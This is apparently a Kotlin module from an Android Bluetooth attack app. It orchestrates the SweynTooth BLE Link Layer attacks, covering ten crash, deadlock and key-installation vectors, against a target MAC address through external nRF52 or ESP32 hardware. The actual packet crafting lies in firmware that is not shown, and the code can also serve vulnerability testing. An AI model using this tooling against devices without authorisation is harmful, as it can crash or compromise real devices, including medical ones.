package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Enum representing the individual SweynTooth attack vectors.
 *
 * Each entry maps to a specific BLE Link Layer vulnerability discovered
 * across SoC SDK implementations from TI, NXP, Cypress, Dialog,
 * Microchip, STMicro, and Telink.
 */
enum class SweynToothVector(val vectorId: String, val description: String) {
    LL_LENGTH_OVERFLOW("ll_length_overflow", "Link Layer Length Overflow (CVE-2019-16336)"),
    ZERO_LTK_INSTALL("zero_ltk_install", "Zero LTK Installation (CVE-2019-17519)"),
    LINK_LAYER_LLID_DEADLOCK("llid_deadlock", "Link Layer LLID Deadlock"),
    TRUNCATED_L2CAP("truncated_l2cap", "Truncated L2CAP Fragment"),
    SILENT_LENGTH_OVERFLOW("silent_length_overflow", "Silent Length Overflow"),
    PUBLIC_KEY_CRASH("public_key_crash", "Public Key Crash"),
    INVALID_CONNECTION_REQUEST("invalid_conn_request", "Invalid Connection Request"),
    INVALID_L2CAP_FRAGMENT("invalid_l2cap_fragment", "Invalid L2CAP Fragment"),
    KEY_SIZE_OVERFLOW("key_size_overflow", "Key Size Overflow"),
    SEQUENTIAL_ATT_DEADLOCK("sequential_att_deadlock", "Sequential ATT Deadlock")
}

/**
 * Module responsible for SweynTooth BLE Link Layer attacks.
 *
 * SweynTooth is a family of 12 vulnerabilities in BLE SDK implementations
 * from major SoC vendors. These flaws affect 480+ device models including
 * medical devices, wearables, and IoT products.
 *
 * This module requires external hardware (nRF52 or ESP32 with SweynTooth
 * firmware) for Link Layer packet crafting, as standard Android Bluetooth
 * chips cannot forge or manipulate LL-level PDUs. The Android phone serves
 * as the command-and-control (C2) interface.
 *
 * @property hardwareManager Interface to the external radio hardware.
 */
class SweynToothModule(private val hardwareManager: HardwareManager) {

    companion object {
        private const val TAG = "SweynToothModule"
        private const val ATTACK_TIMEOUT_MS = 30_000L
    }

    private val _isRunning = MutableStateFlow(false)
    val isRunning = _isRunning.asStateFlow()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var attackJob: Job? = null

    /**
     * Checks whether the external hardware is connected and ready.
     *
     * @return true if hardware is in a connected state.
     */
    fun isHardwareConnected(): Boolean {
        val state = hardwareManager.hardwareState.value
        return state == HardwareState.CONNECTED_BTLEJACK || state == HardwareState.CONNECTED_DUAL
    }

    /**
     * Starts a single SweynTooth attack vector against the target device.
     *
     * Sends the attack command to external hardware via serial and collects
     * log output as a [Flow]. The hardware firmware handles the actual LL
     * packet crafting and injection.
     *
     * @param targetDevice The BLE device to target.
     * @param vector The specific SweynTooth vulnerability to test.
     * @return A [Flow] emitting log lines from the hardware during the attack.
     * @throws IllegalArgumentException if the target MAC address is invalid.
     */
    fun startAttack(targetDevice: TargetDevice, vector: SweynToothVector): Flow<String> {
        MacValidator.requireValid(targetDevice.macAddress)

        return flow {
            _isRunning.value = true
            emit("[SweynTooth] Starting ${vector.description}")
            emit("[SweynTooth] Target: ${targetDevice.macAddress}")
            emit("[SweynTooth] Vector: ${vector.vectorId}")

            hardwareManager.sendCommand("sweyntooth -t ${targetDevice.macAddress} -v ${vector.vectorId}")

            try {
                val result = withTimeoutOrNull(ATTACK_TIMEOUT_MS) {
                    hardwareManager.deviceLogs.first { logLine ->
                        logLine.contains("complete", ignoreCase = true) ||
                        logLine.contains("vulnerable", ignoreCase = true) ||
                        logLine.contains("not vulnerable", ignoreCase = true) ||
                        logLine.contains("timeout", ignoreCase = true) ||
                        logLine.contains("error", ignoreCase = true) ||
                        logLine.contains("crash detected", ignoreCase = true) ||
                        logLine.contains("deadlock detected", ignoreCase = true)
                    }
                }

                if (result != null) {
                    emit("[SweynTooth] $result")
                } else {
                    emit("[SweynTooth] Attack timed out after ${ATTACK_TIMEOUT_MS / 1000}s")
                }
            } finally {
                _isRunning.value = false
                emit("[SweynTooth] Vector ${vector.vectorId} finished")
            }
        }.flowOn(Dispatchers.IO)
    }

    /**
     * Runs all SweynTooth vectors sequentially against the target device.
     *
     * Iterates through every [SweynToothVector] entry, sending each attack
     * command to the hardware and collecting results.
     *
     * @param targetDevice The BLE device to target.
     * @return A [Flow] emitting log lines for all vectors.
     * @throws IllegalArgumentException if the target MAC address is invalid.
     */
    fun startFullSuite(targetDevice: TargetDevice): Flow<String> {
        MacValidator.requireValid(targetDevice.macAddress)

        return flow {
            _isRunning.value = true
            emit("[SweynTooth] Starting full vulnerability suite")
            emit("[SweynTooth] Target: ${targetDevice.macAddress}")
            emit("[SweynTooth] Vectors: ${SweynToothVector.entries.size}")
            emit("---")

            try {
                for (vector in SweynToothVector.entries) {
                    emit("[SweynTooth] Running: ${vector.description}")
                    hardwareManager.sendCommand("sweyntooth -t ${targetDevice.macAddress} -v ${vector.vectorId}")

                    val result = withTimeoutOrNull(ATTACK_TIMEOUT_MS) {
                        hardwareManager.deviceLogs.first { logLine ->
                            logLine.contains("complete", ignoreCase = true) ||
                            logLine.contains("vulnerable", ignoreCase = true) ||
                            logLine.contains("not vulnerable", ignoreCase = true) ||
                            logLine.contains("timeout", ignoreCase = true) ||
                            logLine.contains("error", ignoreCase = true) ||
                            logLine.contains("crash detected", ignoreCase = true) ||
                            logLine.contains("deadlock detected", ignoreCase = true)
                        }
                    }

                    if (result != null) {
                        emit("[SweynTooth] ${vector.vectorId}: $result")
                    } else {
                        emit("[SweynTooth] ${vector.vectorId}: Timed out")
                    }
                    emit("---")
                }
                emit("[SweynTooth] Full suite complete")
            } finally {
                _isRunning.value = false
            }
        }.flowOn(Dispatchers.IO)
    }

    /**
     * Stops any active attack and sends the stop command to hardware.
     */
    fun stopAttack() {
        attackJob?.cancel()
        attackJob = null
        _isRunning.value = false
        hardwareManager.sendCommand("stop")
        Log.d(TAG, "Attack stopped by user")
    }

    /**
     * Releases all resources: cancels any running attack, stops hardware,
     * and cancels the coroutine scope.
     */
    fun close() {
        stopAttack()
        scope.cancel()
    }
}
